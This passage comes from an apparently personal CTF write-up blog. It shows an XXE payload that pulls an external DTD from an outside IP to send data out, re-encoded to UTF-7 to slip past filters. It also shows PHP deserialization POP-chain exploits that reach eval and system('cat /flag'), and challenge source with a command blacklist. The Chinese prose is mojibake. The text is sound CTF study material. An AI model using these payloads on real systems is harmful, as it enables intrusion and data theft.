<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
</span></span><span class="line"><span class="cl">&lt;!DOCTYPE a [
</span></span><span class="line"><span class="cl">&lt;!ENTITY % dtd SYSTEM &#34;http://8.148.66.159:10726/xxe.dtd&#34;&gt;
</span></span><span class="line"><span class="cl">%dtd;%code;%send;
</span></span><span class="line"><span class="cl">]&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç”¨è™šæ‹Ÿæœºæ”¹æˆUTF-7</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">cat</span> <span class="mf">1.</span><span class="n">xml</span> <span class="o">|</span> <span class="n">iconv</span> <span class="o">-</span><span class="n">f</span> <span class="n">utf</span><span class="o">-</span><span class="mi">8</span> <span class="o">-</span><span class="n">t</span> <span class="n">utf</span><span class="o">-</span><span class="mi">7</span> <span class="o">&gt;</span> <span class="n">payload</span><span class="o">.</span><span class="mi">8</span><span class="o">-</span><span class="mf">7.</span><span class="n">xml</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">å½“ç„¶ï¼Œé¦–å…ˆä½ è¦çœ‹çœ‹ä½ æ˜¯ä¸æ˜¯</span><span class="n">utf</span><span class="o">-</span><span class="mi">8</span><span class="err">ç¼–ç çš„</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">file</span> <span class="o">-</span><span class="n">i</span> <span class="mf">1.</span><span class="n">xml</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ”¹åçš„</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-7&#34;?&gt;
</span></span><span class="line"><span class="cl">/v8APAAh-DOCTYPE a +AFs
</span></span><span class="line"><span class="cl">	+ADWAIQ-ENTITY +ACU dtd SYSTEM +ACI-http://8.148.66.159:10726/xxe.dtd+ACIAPg
</span></span><span class="line"><span class="cl">	+ACU-dtd+ADsAJQ-code+ADsAJQ-send+ADs
</span></span><span class="line"><span class="cl">+AFOAPg
</span></span></code></pre></td></tr></table>
</div>
</div><p>å‘åŒ…å°±èƒ½æŠ“åˆ°äº†ï¼Œç”¨vpsçš„è¯ä¼šæ–¹ä¾¿ä¸€ç‚¹ä½†æ˜¯ï¼Œå†…ç½‘ç©¿é€åå¼¹shellæ¯•ç«Ÿæ˜¯è‡ªå·±ç ”ç©¶å‡ºæ¥çš„ï¼Œæ¯æ¬¡ç”¨éƒ½è§‰å¾—è‡ªå·±å¾ˆå‰å®³QAQ</p>
<p><img src="/p/qctf2025/image-20251117141520682.png"
	width="1211"
	height="451"
	srcset="/p/qctf2025/image-20251117141520682_hu14280778209089790421.png 480w, /p/qctf2025/image-20251117141520682_hu8663116316428088128.png 1024w"
	loading="lazy"
	
		alt="image-20251117141520682"
	
	
		class="gallery-image" 
		data-flex-grow="268"
		data-flex-basis="644px"
	
></p>
<h3 id="é­”æœ¯å¤§æ‚çƒ©">é­”æœ¯å¤§æ‚çƒ©
</h3><h4 id="çŸ¥è¯†ç‚¹phpååºåˆ—åŒ–">çŸ¥è¯†ç‚¹ï¼šphpååºåˆ—åŒ–
</h4><p>week3æœ€ç®€å•çš„ä¸€é›†</p>
<p>ç›´æ¥è´´expäº†ï¼Œå› ä¸ºæ˜¯å†™å‡ºäº†çš„é¢˜ç›®</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Wuhuarou</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$Wuhuarou</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;Nice Wuhuarou!&lt;/br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">Wuhuarou</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Fentiao</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$Fentiao</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$Hongshufentiao</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;Nice Fentiao!&lt;/br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">Fentiao</span> <span class="o">-&gt;</span> <span class="na">Hongshufentiao</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Baicai</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$Baicai</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$key</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;Nice Baicai!&lt;/br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$Baicai</span> <span class="o">=</span> <span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">Baicai</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$Baicai</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Wanzi</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$Wanzi</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__invoke</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;Nice Wanzi!&lt;/br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">Wanzi</span> <span class="o">-&gt;</span> <span class="na">Xianggu</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Xianggu</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$Xianggu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$Jinzhengu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$Jinzhengu</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">Jinzhengu</span> <span class="o">=</span> <span class="nv">$Jinzhengu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$arg</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;Nice Xianggu!&lt;/br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">Xianggu</span> <span class="o">-&gt;</span> <span class="na">Bailuobo</span> <span class="o">=</span> <span class="nv">$this</span> <span class="o">-&gt;</span> <span class="na">Jinzhengu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Huluobo</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$HuLuoBo</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__set</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span><span class="nv">$arg</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;Nice Huluobo!&lt;/br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$arg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Wuhuarou</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Fentiao</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$c</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Baicai</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$d</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Wanzi</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$e</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Xianggu</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$f</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Huluobo</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="c1">//$f -&gt; __set(&#34;HuLuoBo&#34;,&#34;system(&#39;ls&#39;);&#34;);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">-&gt;</span> <span class="na">Wuhuarou</span> <span class="o">=</span> <span class="nv">$b</span><span class="p">;</span>   <span class="c1">//tostring
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$b</span> <span class="o">-&gt;</span> <span class="na">Fentiao</span> <span class="o">=</span> <span class="nv">$c</span><span class="p">;</span>    <span class="c1">//get
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$c</span> <span class="o">-&gt;</span> <span class="na">Baicai</span> <span class="o">=</span> <span class="nv">$d</span><span class="p">;</span>     <span class="c1">//invoke
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$d</span> <span class="o">-&gt;</span> <span class="na">Wanzi</span> <span class="o">=</span> <span class="nv">$e</span><span class="p">;</span>      <span class="c1">//call
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$e</span> <span class="o">-&gt;</span> <span class="na">Xianggu</span> <span class="o">=</span> <span class="nv">$f</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$e</span> <span class="o">-&gt;</span> <span class="na">Jinzhengu</span> <span class="o">=</span> <span class="s2">&#34;system(&#39;cat /flag&#39;);&#34;</span><span class="p">;</span>  <span class="c1">//set
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">unserialize</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="week4">Week4
</h2><h3 id="path-to-hero">Path to Hero
</h3><h4 id="çŸ¥è¯†ç‚¹phpååºåˆ—åŒ–md5rce">çŸ¥è¯†ç‚¹ï¼šphpååºåˆ—åŒ–ã€md5ã€rce
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="s1">&#39;index.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">Class</span> <span class="nc">Start</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$ishero</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$adventure</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ishero</span><span class="p">,</span> <span class="s2">&#34;hero&#34;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ishero</span> <span class="o">!==</span> <span class="s2">&#34;hero&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;å‹‡è€…å•Šï¼Œå»å¯»æ‰¾åˆ©åˆƒå§&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">adventure</span><span class="o">-&gt;</span><span class="na">sword</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;å‰æ–¹çš„åŒºåŸŸä»¥åå†æ¥æ¢ç´¢å§ï¼&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Sword</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$test1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$test2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$go</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test1</span> <span class="o">!==</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test2</span> <span class="o">&amp;&amp;</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test1</span><span class="p">)</span> <span class="o">==</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test2</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;æ²‰ç¡çš„åˆ©åˆƒè¢«ä½ å”¤é†’äº†ï¼Œæ˜¯æ—¶å€™å»è®¨ä¼é­”ç‹äº†ï¼&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">go</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;Dead&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Mon3tr</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$end</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$result</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Treasure</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;åˆ°æ­¤ä¸ºæ­¢äº†ï¼é­”ç‹&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/^cat|flag|tac|system|ls|head|tail|more|less|nl|sort|find?/i&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">end</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$result</span><span class="o">-&gt;</span><span class="na">end</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">end</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;éš¾é“â€¦â€¦è¦è¾“äº†å—ï¼Ÿ&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Treasure</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$arg</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;ç»“æŸäº†ï¼Ÿ&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$arg</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;HERO&#34;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;HERO&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>é“¾å­ç®€å•ï¼Œç»•è¿‡ç®€å•ï¼Œå°±æ˜¯æœ€åæ‰§è¡Œå‘½ä»¤çš„çš„æ—¶å€™å¦‚ä½•å¤„ç†<code>$arg[0]</code>æœ‰äº›é—®é¢˜ã€‚</p>
<p>è¿™é‡Œargå°±æ˜¯æ•°ç»„ï¼ŒæŒ‡å‘çš„å°±æ˜¯<code>Mon3tr</code>çš„<code>end</code>å‚æ•°ï¼Œwafä¸å¤šå†ä¼ ä¸ªevalå°±è¡Œ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">Class</span> <span class="nc">Start</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$ishero</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$adventure</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ishero</span><span class="p">,</span> <span class="s2">&#34;hero&#34;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ishero</span> <span class="o">!==</span> <span class="s2">&#34;hero&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;å‹‡è€…å•Šï¼Œå»å¯»æ‰¾åˆ©åˆƒå§&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">adventure</span><span class="o">-&gt;</span><span class="na">sword</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">{</span>
